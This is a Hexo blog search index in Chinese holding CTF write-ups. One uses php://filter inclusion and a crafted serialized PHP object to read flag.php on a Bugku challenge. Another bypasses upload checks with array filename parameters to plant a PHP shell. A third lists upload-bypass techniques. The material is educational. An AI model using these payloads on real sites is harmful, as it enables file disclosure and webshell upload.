@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>linux持久化</title>
+    <link href="/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/"/>
+    <url>/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>内网</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PHP序列化</title>
+    <link href="/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p> 在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。大概就是将数组和类的值转换成字符串来传值。</p><p>序列化</p><ul><li>serialize ( mixed $value )</li></ul><p>反序列化</p><ul><li>unserialize ( mixed $value )</li></ul><h3 id="序列化例子"><a href="#序列化例子" class="headerlink" title="序列化例子"></a>序列化例子</h3><h4 id="类的序列化"><a href="#类的序列化" class="headerlink" title="类的序列化"></a>类的序列化</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">var $name;</span><br><span class="line">var $age;</span><br><span class="line">function __construct($name,$age)</span><br><span class="line">&#123;</span><br><span class="line">$this -&gt; name &#x3D; $name;</span><br><span class="line">$this -&gt; age &#x3D; $age;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 &#x3D; new test(&#39;lmt&#39;,&#39;3&#39;);</span><br><span class="line">echo &quot;before serialize&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">var_dump($test1);</span><br><span class="line">echo &quot;&lt;br&gt; after serialize &lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($test1));</span><br></pre></td></tr></table></figure><p>输出结果</p><blockquote><p>O:4:”test”:2:{s:4:”name”;s:3:”lmt”;s:3:”age”;s:1:”3”;}</p></blockquote><blockquote><p>O:4:”test”:2：表示，序列化的是一个类（object），类名的长度为4，类中有两个变量名</p></blockquote><h3 id="序列化相关的题"><a href="#序列化相关的题" class="headerlink" title="序列化相关的题"></a>序列化相关的题</h3><p>welcome to the bugku</p><p><a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">if(isset( $user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))</span><br><span class="line">&#123;  </span><br><span class="line"> echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line"> include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;  </span><br><span class="line"> echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然想让我们利用源码去得到flag。</p><p>开始有三个变量：user,file,pass，但是我们发现这里的pass也就是password没有什么用，所以我们重点关注前两个变量。看下面的条件</p><p>（1）这里isset的意思是查看变量是否存在，即user不能为空。<br>（2）file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p><ul><li>file_get_contents($user,’r’)<br>（3）后面提示了我们所以我们要在满足条件之后读取file=hint.php。</li><li>include($file); //hint.php</li></ul><p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。<br>然后我们在文件包含出hint.PHP</p><ul><li><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</a></li></ul><p><img src="/img/2.png" srcset="/img/loading.gif" alt="图片"></p><p>解码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line"></span><br><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用伪协议包含出index.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#index.php  </span><br><span class="line">&lt;?php    </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line"></span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;   </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;  </span><br><span class="line">        exit();    </span><br><span class="line">    &#125;else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;!--    </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>indep.php中 <strong>preg_match(“/flag/“,$file)</strong> 不能直接包含出flag.php</p><p>但是hint.php里有 <strong>class Flag{//flag.php</strong><br>以及</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include($file);     </span><br><span class="line">  $password &#x3D; unserialize($password);    </span><br><span class="line">  echo $password;</span><br></pre></td></tr></table></figure><p>所以这里file参数须是hint.php，因为只有在hint.php中才会包含类Flag<br>然后我们构造password把参数传进hint.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;</span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    $a &#x3D; new Flag();  </span><br><span class="line">    $a-&gt;file &#x3D; &quot;flag.php&quot;;  </span><br><span class="line">    $a &#x3D; serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出</p><ul><li>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</li></ul><p><img src="/img/3.png" srcset="/img/loading.gif" alt="3"></p><p><img src="/img/4.png" srcset="/img/loading.gif" alt="4"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>php</tag>
+      
+      <tag>序列化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>代码审计_文件上传ctf题</title>
+    <link href="/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/"/>
+    <url>/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/</url>
+    
+    <content type="html"><![CDATA[<p>网鼎杯第二场 wafUpload</p><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><pre><code>&lt;?phpm#$sandbox = &#39;/var/www/html/upload/&#39; . md5(&quot;phpIsBest&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);$sandbox = &#39;&#39;;#@mkdir($sandbox);#@chdir($sandbox);if (!empty($_FILES[&#39;file&#39;])) {    #mime check    if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {        die(&#39;This type is not allowed!&#39;);    }else{        echo &quot;pass 1n&quot;;    }    #check filename    $file = empty($_POST[&#39;filename&#39;]) ? $_FILES[&#39;file&#39;][&#39;name&#39;] : $_POST[&#39;filename&#39;];    if (!is_array($file)) {        $file = explode(&#39;.&#39;, strtolower($file));    }    $ext = end($file);    if (!in_array($ext, [&#39;jpg&#39;, &#39;png&#39;, &#39;gif&#39;])) {        die(&#39;This file is not allowed!&#39;);    }else{        echo &quot;pass 2n&quot;;    }    $filename = reset($file) . &#39;.&#39; . $file[count($file) - 1];    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $sandbox . &#39;/&#39; . $filename)) {        echo &#39;Success!&#39;;        echo &#39;filepath:&#39; . $sandbox . &#39;/&#39; . $filename;    } else {        echo &#39;Failed!&#39;;    }}show_source(__file__);?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Upload Your Shell&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;    &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;&lt;br&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p><p>根据题目，需要绕过两层判断。</p><p>1.第一层，直接抓包修改 MIME 为 image/png 就行了。</p><p>2.第二层，构造 filename 字段为数组</p><p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值</p><blockquote><p>$file = empty($_POST[‘filename’]) ? $_FILES[‘file’][‘name’] : $_POST[‘filename’];</p></blockquote><p>如果没有POST该字段，$file变量取上传时的name，即** $_FILES[‘file’][‘name’] **</p><p>若$file文件名不是数组，就对字符串中的点号. 进行explode分割，分割成数组<br>如上传aa.bb.php会被切为</p><p>[0]  = &gt; ‘aa’</p><p>[1] =&gt; ‘bb’</p><p>[2] =&gt; ‘php’</p><p>这样的数组</p><p><strong>获取扩展名代码</strong></p><blockquote><p>$ext = end($file);</p></blockquote><p>利用了end函数，这个函数可以返回数组的最后一项。</p><p>也就返回了最后的php作为$ext，再经过判断ext是否是jpg、png、gif的一种。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>利用end reset函数的缺陷<br>举个例子：</p><pre><code>&lt;?php$arr = array();$arr[0] = &#39;first&#39;;$arr[1] = &#39;second&#39;;$arr[2] = &#39;third&#39;;var_dump($arr);echo &quot;the result of reset: &quot;.reset($arr).&quot;n&quot;;echo &quot;the result of end: &quot;.end($arr);?&gt;</code></pre><p>end 函数原本的作用就是返回数组的最后一个元素，在上面看的是正常的。但是如果我们这里把对数组赋值的顺序换一下（先给 arr[2] 赋值），可以看到结果就变了。<br>继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值，并不一定是arr[0]。</p><p>所以构造playload</p><blockquote><p>filename[1] = php<br>filename[0] = png</p></blockquote><p>end取的是png能通过校验<br>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><blockquote><p>$filename = reset($file) . ‘.’ . $file[count($file) - 1];</p></blockquote><p>此时$file[count($file) - 1] 取到的就是$file[2-1]-&gt;$filename[1]<br>最后拼接出了 php.php，就达到了上传 shell 的目的。</p><p><a href="https://www.anquanke.com/post/id/164561#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164561#h2-1</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>文件上传</tag>
+      
+      <tag>代码审计</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>文件上传原理及绕过</title>
+    <link href="/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
+    <url>/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
+    
+    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传本质是客户端向服务器端的POST请求，消息里面是上传的信息。前端上传页面需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p><pre><code>&lt;form action=&#39;&#39; enctype=&#39;multipart/form-data&#39; method=&#39;POST&#39;&gt;&lt;input type=&#39;file&#39; name=&#39;file&#39;&gt;&lt;/form&gt;</code></pre><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p></li><li><p>对于上传文件的MIMETYPE 没有做检查</p></li><li><p>权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）</p></li><li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p></li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h6 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h6><p>表单中通过onsumbit=checkfile()调用js函数来检测文件后缀名</p><ul><li>通过firebug或burp suite来绕过</li></ul><h6 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h6><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型</p><ul><li>抓包重放绕过，修改Content-Type</li></ul><p>MIMETYPE表</p><pre><code>text/plain（纯文本）text/html（HTML文档）text/javascript（js代码）application/xhtml+xml（XHTML文档）image/gif（GIF图像）image/jpeg（JPEG图像）image/png（PNG图像）video/mpeg（MPEG动画）application/octet-stream（二进制数据）application/pdf（PDF文档）application/(编程语言) 该种语言的代码application/msword（Microsoft Word文件）message/rfc822（RFC 822形式）multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）application/x-www-form-urlencoded（POST方法提交的表单）multipart/form-data（POST提交时伴随文件上传的表单）</code></pre><p>######</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>文件上传</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="/2018/05/23/hello-world/"/>
+    <url>/2018/05/23/hello-world/</url>
+    
+    <content type="html"><![CDATA[<p>hello world.</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
